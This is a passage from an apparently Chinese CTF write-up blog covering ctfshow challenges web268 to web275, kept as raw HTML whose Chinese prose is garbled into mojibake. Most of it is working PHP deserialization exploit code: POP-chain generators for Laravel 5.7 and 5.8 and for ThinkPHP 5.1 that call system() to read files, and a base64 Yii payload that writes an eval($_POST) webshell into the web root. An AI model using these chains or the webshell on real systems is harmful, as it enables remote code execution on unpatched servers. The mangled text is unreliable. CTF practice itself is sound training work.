class="built_in">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åè®¿é—® 1.php ç„¶å post ä¸€ä¸ª 1=system (â€œcat /flagsâ€); å³å¯</p><h1 id="web269"><a class="markdownIt-Anchor" href="#web269">#</a> web269ï¼š</h1><p>â€‹å’Œä¸Šä¸€ä¸ªé¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œæ²¡ä»»ä½•åŒºåˆ«ã€‚</p><h1 id="web270"><a class="markdownIt-Anchor" href="#web270">#</a> web270ï¼š</h1><p>â€‹268 é¢˜çš„ poc ä¾æ—§èƒ½ç”¨ï¼Œç›´æ¥ç”¨ã€‚</p><h1 id="web271"><a class="markdownIt-Anchor" href="#web271">#</a> web271ï¼š</h1><p>â€‹Laravel 5.7 çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæºç åœ¨è¿™å„¿ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcmF2ZWwvbGFyYXZlbC90cmVlLzUuNyVFMyU4MCU4Mg==">https://github.com/laravel/laravel/tree/5.7ã€‚</span></p><p>â€‹ä¸å¤§ä¼šå¼€å‘ï¼Œç›´æ¥ä¸Š poc ç®—äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters[]=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app=<span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web272"><a class="markdownIt-Anchor" href="#web272">#</a> web272ï¼š</h1><p>â€‹ä¸Šä¸€ç¯‡æ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTEzODM1MDU3">laravel5.8 ååºåˆ—åŒ–æ¼æ´å¤ç°</span></p><p>â€‹ç›´æ¥ä¸Š pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;tac /f*&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web273"><a class="markdownIt-Anchor" href="#web273">#</a> web273ï¼š</h1><p>â€‹ç”¨è¿™ä¸ª pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>=&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>=&quot;<span class="title class_">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web274"><a class="markdownIt-Anchor" href="#web274">#</a> web274ï¼š</h1><p>â€‹thinkphp ååºåˆ—åŒ–ï¼Œè´´ä¸ªæ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjYxOT90aW1lX18xMzExPW40JTJCeG5EMERnNyUzRDd3eFdxR05ubURVeFlxS1F1NUQ1aTVRNXBkeCN0b2MtMQ==">thinkphp5.1.x~5.2.x ç‰ˆæœ¬ååºåˆ—åŒ–é“¾æŒ–æ˜åˆ†æ</span></p><p>â€‹æ”¾ä¸ª pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶åï¼Œå°†ç”Ÿæˆçš„ payload æ”¾åœ¨ä¸‹é¢çš„ payload å¤„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=payload<span class="built_in">&amp;</span>lin=tac /f*</span><br></pre></td></tr></table></figure><p>â€‹å³å¯å¾—åˆ° flagã€‚</p><h1 id="web275"><a class="markdownIt-Anchor" href="#web275">#</a> web275ï¼š</h1><p>â€‹å°å£°å˜€å’•ï¼šä¸ºä»€ä¹ˆè¿˜æ²¡æœ‰ pop é“¾ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span 